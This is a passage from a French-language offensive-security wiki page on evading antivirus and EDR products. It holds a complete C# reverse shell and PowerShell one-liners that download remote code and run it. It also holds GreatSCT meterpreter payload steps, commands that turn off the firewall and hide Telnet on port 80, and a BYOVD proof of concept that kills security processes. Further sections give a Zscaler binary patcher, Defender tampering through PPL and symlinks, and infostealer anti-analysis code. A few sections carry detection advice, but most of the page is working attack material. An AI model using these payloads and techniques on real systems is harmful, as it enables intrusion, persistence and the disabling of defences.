Il s'agit d'injecter le code malveillant de post-exploitation **dans son propre processus**. De cette manière, vous évitez de créer un nouveau processus qui pourrait être scanné par l'AV, mais l'inconvénient est que si l'exécution de votre payload tourne mal, il y a une **bien plus grande chance** de **perdre votre beacon** car il pourrait planter.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> If you want to read more about C# Assembly loading, please check out this article [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) and their InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Vous pouvez aussi charger des C# Assemblies **depuis PowerShell**, consultez [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) et la vidéo de S3cur3th1sSh1t ([https://www.youtube.com/watch?v=oe11Q-3Akuk](https://www.youtube.com/watch?v=oe11Q-3Akuk)).

## Using Other Programming Languages

Comme proposé dans [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), il est possible d'exécuter du code malveillant en utilisant d'autres langages en donnant à la machine compromise l'accès **à l'environnement interpréteur installé sur l'Attacker Controlled SMB share**.

En permettant l'accès aux Interpreter Binaries et à l'environnement sur le partage SMB, vous pouvez **exécuter du code arbitraire dans ces langages en mémoire** sur la machine compromise.

Le repo indique : Defender scanne toujours les scripts mais en utilisant Go, Java, PHP, etc., nous avons **plus de flexibilité pour bypasser les signatures statiques**. Des tests avec des reverse shells non obfusqués aléatoires dans ces langages se sont avérés concluants.

## TokenStomping

Token stomping est une technique qui permet à un attaquant de **manipuler le token d'accès ou un produit de sécurité comme un EDR ou un AV**, leur permettant de réduire ses privilèges afin que le processus ne meure pas mais n'ait plus les permissions pour vérifier les activités malveillantes.

Pour prévenir cela, Windows pourrait **empêcher les processus externes** d'obtenir des handles sur les tokens des processus de sécurité.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Comme décrit dans [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), il est facile de déployer Chrome Remote Desktop sur un PC victime puis de l'utiliser pour le prendre en main et maintenir la persistance :
1. Download from https://remotedesktop.google.com/, cliquez sur "Set up via SSH", puis cliquez sur le fichier MSI pour Windows afin de télécharger le MSI.
2. Exécutez l'installateur en mode silencieux sur la victime (admin requis) : `msiexec /i chromeremotedesktophost.msi /qn`
3. Retournez sur la page Chrome Remote Desktop et cliquez sur next. L'assistant vous demandera ensuite d'autoriser ; cliquez sur le bouton Authorize pour continuer.
4. Exécutez le paramètre donné avec quelques ajustements : `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Notez le param pin qui permet de définir le PIN sans utiliser l'interface graphique).

## Advanced Evasion

L'évasion est un sujet très compliqué ; parfois vous devez prendre en compte de nombreuses sources de télémétrie dans un seul système, il est donc pratiquement impossible de rester complètement indétecté dans des environnements matures.

Chaque environnement contre lequel vous opérez aura ses propres forces et faiblesses.

Je vous encourage vivement à regarder cette conférence de [@ATTL4S](https://twitter.com/DaniLJ94), pour obtenir une introduction aux techniques d'Advanced Evasion.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Ceci est aussi une autre excellente conférence de [@mariuszbit](https://twitter.com/mariuszbit) au sujet de l'Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Vous pouvez utiliser [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) qui va **retirer des parties du binaire** jusqu'à ce qu'il **détermine quelle partie Defender** trouve malveillante et vous la retourne.\
Un autre outil faisant la **même chose est** [**avred**](https://github.com/dobin/avred) avec un service web ouvert sur [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Jusqu'à Windows10, toutes les versions de Windows incluaient un **serveur Telnet** que vous pouviez installer (en tant qu'administrateur) en faisant :
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Faites en sorte qu'il **démarre** au démarrage du système et **exécutez-le** maintenant :
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Changer le port telnet** (stealth) et désactiver le firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Téléchargez-le depuis : [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (vous voulez les bin downloads, pas le setup)

**ON THE HOST** : Exécutez _**winvnc.exe**_ et configurez le serveur :

- Activez l'option _Disable TrayIcon_
- Définissez un mot de passe dans _VNC Password_
- Définissez un mot de passe dans _View-Only Password_

Ensuite, placez le binaire _**winvnc.exe**_ et le fichier **newly** créé _**UltraVNC.ini**_ à l'intérieur de la **victim**

#### **Reverse connection**

Le **attacker** doit **exécuter sur** son **host** le binaire `vncviewer.exe -listen 5900` afin qu'il soit **préparé** à capter une reverse **VNC connection**. Ensuite, sur la **victim** : Démarrez le démon `winvnc.exe -run` et lancez `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING :** Pour rester discret vous ne devez pas faire certaines choses

- Ne lancez pas `winvnc` s'il est déjà en cours d'exécution sinon vous déclencherez un [popup](https://i.imgur.com/1SROTTl.png). Vérifiez s'il tourne avec `tasklist | findstr winvnc`
- Ne lancez pas `winvnc` sans `UltraVNC.ini` dans le même répertoire sinon cela fera apparaître [la fenêtre de configuration](https://i.imgur.com/rfMQWcf.png)
- Ne lancez pas `winvnc -h` pour l'aide sinon vous déclencherez un [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Téléchargez-le depuis : [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
À l'intérieur de GreatSCT :
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Maintenant, **démarrez le lister** avec `msfconsole -r file.rc` et **exécutez** le **xml payload** avec :
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Le defender actuel terminera le processus très rapidement.**

### Compilation de notre propre reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### First C# Revershell

Compilez-le avec :
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Utilisez-le avec :
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# en utilisant le compilateur
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Téléchargement et exécution automatiques :
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Liste d'obfuscateurs C# : [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Exemple : utilisation de Python pour construire des injecteurs :

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Autres outils
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### More

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Neutraliser AV/EDR depuis l'espace noyau

Storm-2603 a exploité un petit utilitaire console connu sous le nom **Antivirus Terminator** pour désactiver les protections endpoints avant de déployer un ransomware. L'outil apporte **son propre driver vulnérable mais *signé*** et l'abuse pour effectuer des opérations privilégiées en kernel que même les services AV Protected-Process-Light (PPL) ne peuvent bloquer.

Points clés
1. **Signed driver** : Le fichier déposé sur le disque est `ServiceMouse.sys`, mais le binaire est le driver légitimement signé `AToolsKrnl64.sys` d'Antiy Labs, issu du “System In-Depth Analysis Toolkit”. Parce que le driver porte une signature Microsoft valide, il se charge même lorsque Driver-Signature-Enforcement (DSE) est activé.
2. **Service installation** :
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
La première ligne enregistre le driver comme un **service kernel** et la seconde le démarre afin que `\\.\ServiceMouse` devienne accessible depuis l'espace utilisateur.
3. **IOCTLs exposed by the driver**
| IOCTL code | Capacité                               |
|-----------:|----------------------------------------|
| `0x99000050` | Terminer un processus arbitraire par PID (utilisé pour tuer les services Defender/EDR) |
| `0x990000D0` | Supprimer un fichier arbitraire sur le disque |
| `0x990001D0` | Décharger le driver et supprimer le service |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works** : BYOVD évite complètement les protections en mode utilisateur ; le code exécuté en kernel peut ouvrir des processus *protégés*, les terminer ou altérer des objets du kernel indépendamment de PPL/PP, ELAM ou d'autres mécanismes de durcissement.

Detection / Mitigation
•  Activer la liste de blocage des drivers vulnérables de Microsoft (`HVCI`, `Smart App Control`) afin que Windows refuse de charger `AToolsKrnl64.sys`.  
•  Surveiller la création de nouveaux services *kernel* et alerter lorsqu'un driver est chargé depuis un répertoire accessible en écriture par tous ou n'est pas présent dans la allow-list.  
•  Rechercher des handles en mode utilisateur vers des device objects personnalisés suivis d'appels `DeviceIoControl` suspects.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Le **Client Connector** de Zscaler applique des règles de posture de l'appareil localement et s'appuie sur Windows RPC pour communiquer les résultats aux autres composants. Deux choix de conception faibles rendent un contournement complet possible :

1. L'évaluation de posture se fait **entièrement côté client** (un booléen est envoyé au serveur).  
2. Les endpoints RPC internes valident seulement que l'exécutable connecté est **signé par Zscaler** (via `WinVerifyTrust`).

En **patchant quatre binaires signés sur disque** les deux mécanismes peuvent être neutralisés :

| Binary | Original logic patched | Result |
|--------|------------------------|--------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Retourne toujours `1` donc chaque check est conforme |
| `ZSAService.exe` | Appel indirect à `WinVerifyTrust` | NOP-ed ⇒ n'importe quel processus (même non signé) peut se binder aux pipes RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Remplacé par `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Vérifications d'intégrité sur le tunnel | Court-circuité |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Après avoir remplacé les fichiers originaux et redémarré la stack de services :

* **Toutes** les vérifications de posture affichent **vert/conformes**.
* Des binaires non signés ou modifiés peuvent ouvrir les endpoints RPC des named-pipe (p.ex. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* L'hôte compromis obtient un accès sans restriction au réseau interne défini par les politiques Zscaler.

Cette étude de cas démontre comment des décisions de confiance purement côté client et de simples vérifications de signature peuvent être contournées avec quelques patchs d'octets.

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) impose une hiérarchie signataire/niveau de sorte que seuls des processus protégés de niveau égal ou supérieur peuvent s'altérer entre eux. De manière offensive, si vous pouvez lancer légitimement un binaire activé pour PPL et contrôler ses arguments, vous pouvez convertir une fonctionnalité bénigne (p.ex., logging) en une primitive d'écriture contrainte, soutenue par PPL, contre des répertoires protégés utilisés par AV/EDR.

Ce qui fait qu'un processus s'exécute en tant que PPL
- The target EXE (and any loaded DLLs) must be signed with a PPL-capable EKU.
- The process must be created with CreateProcess using the flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- A compatible protection level must be requested that matches the signer of the binary (e.g., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` for anti-malware signers, `PROTECTION_LEVEL_WINDOWS` for Windows signers). Wrong levels will fail at creation.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Outils de lancement
- Open-source helper: CreateProcessAsPPL (selects protection level and forwards arguments to the target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Le binaire système signé `C:\Windows\System32\ClipUp.exe` se lance lui‑même et accepte un paramètre pour écrire un fichier de log dans un chemin spécifié par l'appelant.
- Lorsqu'il est lancé en tant que processus PPL, l'écriture du fichier s'effectue avec le backing PPL.
- ClipUp ne peut pas analyser les chemins contenant des espaces ; utilisez les chemins courts 8.3 pour pointer vers des emplacements normalement protégés.

8.3 short path helpers
- Lister les noms courts : `dir /x` dans chaque répertoire parent.
- Obtenir le chemin court dans cmd : `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Lancer le LOLBIN compatible PPL (ClipUp) avec `CREATE_PROTECTED_PROCESS` en utilisant un launcher (ex. CreateProcessAsPPL).
2) Passer l'argument de chemin de log de ClipUp pour forcer la création d'un fichier dans un répertoire AV protégé (ex. Defender Platform). Utiliser des noms courts 8.3 si nécessaire.
3) Si le binaire cible est normalement ouvert/verrouillé par l'AV pendant son exécution (ex. MsMpEng.exe), planifier l'écriture au démarrage avant que l'AV ne se lance en installant un service auto-start qui s'exécute plus tôt de façon fiable. Valider l'ordre de démarrage avec Process Monitor (boot logging).
4) Au reboot, l'écriture backing PPL se produit avant que l'AV ne verrouille ses binaires, corrompant le fichier cible et empêchant le démarrage.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notes et contraintes
- Vous ne pouvez pas contrôler le contenu que ClipUp écrit au-delà de l'emplacement ; ce primitif convient davantage à la corruption qu'à une injection précise de contenu.
- Nécessite des droits Administrateur local/SYSTEM pour installer/démarrer un service et une fenêtre de redémarrage.
- Le timing est critique : la cible ne doit pas être ouverte ; l'exécution au démarrage évite les verrous de fichiers.

Détections
- Création de processus de `ClipUp.exe` avec des arguments inhabituels, en particulier lorsque le parent est un lanceur non standard, autour du démarrage.
- Nouveaux services configurés pour démarrer automatiquement des binaires suspects et démarrant systématiquement avant Defender/AV. Examiner la création/modification de services avant les échecs de démarrage de Defender.
- Surveillance d'intégrité des fichiers sur les binaires de Defender/répertoires Platform ; créations/modifications de fichiers inattendues par des processus avec des indicateurs protected-process.
- Télémétrie ETW/EDR : rechercher des processus créés avec `CREATE_PROTECTED_PROCESS` et une utilisation anormale du niveau PPL par des binaires non-AV.

Contre-mesures
- WDAC/Code Integrity : restreindre quels binaires signés peuvent s'exécuter en tant que PPL et sous quels parents ; bloquer l'appel à ClipUp en dehors de contextes légitimes.
- Hygiène des services : restreindre la création/modification des services à démarrage automatique et surveiller la manipulation de l'ordre de démarrage.
- S'assurer que Defender tamper protection et les protections d'early-launch sont activées ; examiner les erreurs de démarrage indiquant une corruption binaire.
- Envisager de désactiver la génération de noms courts 8.3 sur les volumes hébergeant des outils de sécurité si compatible avec votre environnement (tester soigneusement).

Références pour PPL et tooling
- Présentation des Protected Processes Microsoft: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- Référence EKU: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (validation de l'ordre): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Article technique (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender choisit la plateforme depuis laquelle il s'exécute en énumérant les sous-dossiers sous:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Il sélectionne le sous-dossier avec la chaîne de version la plus élevée lexicographiquement (p.ex., `4.18.25070.5-0`), puis démarre les processus du service Defender à partir de là (mettant à jour les chemins de service/registre en conséquence). Cette sélection fait confiance aux entrées de répertoire, y compris aux directory reparse points (symlinks). Un administrateur peut exploiter cela pour rediriger Defender vers un chemin inscriptible par un attaquant et réaliser du DLL sideloading ou perturber le service.

Prérequis
- Administrateur local (nécessaire pour créer des répertoires/symlinks sous le dossier Platform)
- Capacité à redémarrer ou déclencher la re-sélection de la Platform Defender (redémarrage du service au démarrage)
- Seuls des outils intégrés sont requis (mklink)

Pourquoi cela fonctionne
- Defender bloque les écritures dans ses propres dossiers, mais sa sélection de Platform fait confiance aux entrées de répertoire et choisit la version la plus élevée lexicographiquement sans valider que la cible résout vers un chemin protégé/de confiance.

Étape par étape (exemple)
1) Préparer un clone inscriptible du dossier Platform actuel, p.ex. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Créez un symlink de répertoire de version supérieure à l'intérieur de Platform pointant vers votre dossier :
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Sélection du déclencheur (reboot recommandé) :
```cmd
shutdown /r /t 0
```
4) Vérifiez que MsMpEng.exe (WinDefend) s'exécute depuis le chemin redirigé :
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Vous devriez observer le nouveau chemin du processus sous `C:\TMP\AV\` et la configuration/registre du service reflétant cet emplacement.

Post-exploitation options
- DLL sideloading/code execution: Déposez/remplacez les DLLs que Defender charge depuis son répertoire d'application pour exécuter du code dans les processus de Defender. Voir la section ci-dessus : [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Supprimez le version-symlink afin que, au prochain démarrage, le chemin configuré ne se résolve pas et que Defender échoue à démarrer :
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Remarque : cette technique n'offre pas d'élévation de privilèges en elle-même ; elle nécessite des droits d'administrateur.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Les red teams peuvent déplacer l'évasion à l'exécution hors de l'implant C2 et dans le module cible lui-même en hookant son Import Address Table (IAT) et en routant des APIs sélectionnées via du code position‑independent contrôlé par l'attaquant (PIC). Cela généralise l'évasion au-delà de la petite surface d'API que de nombreux kits exposent (p.ex., CreateProcessA), et étend les mêmes protections aux BOFs et aux DLLs post‑exploitation.

High-level approach
- Stage a PIC blob alongside the target module using a reflective loader (prepended or companion). The PIC must be self‑contained and position‑independent.
- As the host DLL loads, walk its IMAGE_IMPORT_DESCRIPTOR and patch the IAT entries for targeted imports (e.g., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) to point at thin PIC wrappers.
- Each PIC wrapper executes evasions before tail‑calling the real API address. Typical evasions include:
- Memory mask/unmask around the call (e.g., encrypt beacon regions, RWX→RX, change page names/permissions) then restore post‑call.
- Call‑stack spoofing: construct a benign stack and transition into the target API so call‑stack analysis resolves to expected frames.
- For compatibility, export an interface so an Aggressor script (or equivalent) can register which APIs to hook for Beacon, BOFs and post‑ex DLLs.

Why IAT hooking here
- Works for any code that uses the hooked import, without modifying tool code or relying on Beacon to proxy specific APIs.
- Covers post‑ex DLLs: hooking LoadLibrary* lets you intercept module loads (e.g., System.Management.Automation.dll, clr.dll) and apply the same masking/stack evasion to their API calls.
- Restores reliable use of process‑spawning post‑ex commands against call‑stack–based detections by wrapping CreateProcessA/W.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notes
- Appliquer le patch après les relocations/ASLR et avant la première utilisation de l'import. Reflective loaders like TitanLdr/AceLdr démontrent du hooking pendant DllMain du module chargé.
- Gardez les wrappers petits et PIC-safe ; résolvez la véritable API via la valeur IAT originale que vous avez capturée avant le patch ou via LdrGetProcedureAddress.
- Utilisez des transitions RW → RX pour le PIC et évitez de laisser des pages writable+executable.

Call‑stack spoofing stub
- Draugr‑style PIC stubs construisent une fausse chaîne d'appels (return addresses into benign modules) puis pivotent vers la véritable API.
- Cela déroute les détections qui s'attendent à des stacks canoniques de Beacon/BOFs vers des APIs sensibles.
- Associez avec stack cutting/stack stitching techniques pour atterrir à l'intérieur des frames attendues avant le prologue de l'API.

Operational integration
- Préfixez les post‑ex DLLs avec le reflective loader afin que le PIC et les hooks s'initialisent automatiquement lors du chargement de la DLL.
- Utilisez un script Aggressor pour enregistrer les APIs cibles afin que Beacon et BOFs bénéficient de manière transparente du même chemin d'évasion sans modification du code.

Detection/DFIR considerations
- IAT integrity : entrées qui résolvent vers des adresses non‑image (heap/anon) ; vérification périodique des pointeurs d'import.
- Stack anomalies : return addresses not belonging to loaded images ; transitions abruptes vers du PIC non‑image ; inconsistent RtlUserThreadStart ancestry.
- Loader telemetry : in‑process writes to IAT, early DllMain activity that modifies import thunks, unexpected RX regions created at load.
- Image‑load evasion : si hooking LoadLibrary*, surveillez les chargements suspects d'automation/clr assemblies corrélés avec des événements de memory masking.

Related building blocks and examples
- Reflective loaders that perform IAT patching during load (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) and stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (e.g., Draugr)

## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

SantaStealer (aka BluelineStealer) illustre comment les info-stealers modernes mélangent AV bypass, anti-analysis et credential access dans un seul workflow.

### Keyboard layout gating & sandbox delay

- Un flag de config (`anti_cis`) énumère les keyboard layouts installés via `GetKeyboardLayoutList`. Si un layout cyrillique est trouvé, l'échantillon dépose un marqueur `CIS` vide et se termine avant d'exécuter les stealers, s'assurant qu'il ne se déclenche jamais sur des locales exclues tout en laissant un artefact de hunting.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Logique en couches `check_antivm`

- Variant A parcourt la liste des processus, hache chaque nom avec une rolling checksum personnalisée, et compare cela à des blocklists intégrées pour debuggers/sandboxes ; il réapplique le checksum au nom de l'ordinateur et vérifie les répertoires de travail tels que `C:\analysis`.
- Variant B inspecte les propriétés du système (process-count floor, uptime récent), appelle `OpenServiceA("VBoxGuest")` pour détecter les additions VirtualBox, et effectue des checks de temporisation autour des sleeps pour repérer le single-stepping. Toute détection entraîne l'arrêt avant le lancement des modules.

### Fileless helper + double ChaCha20 reflective loading

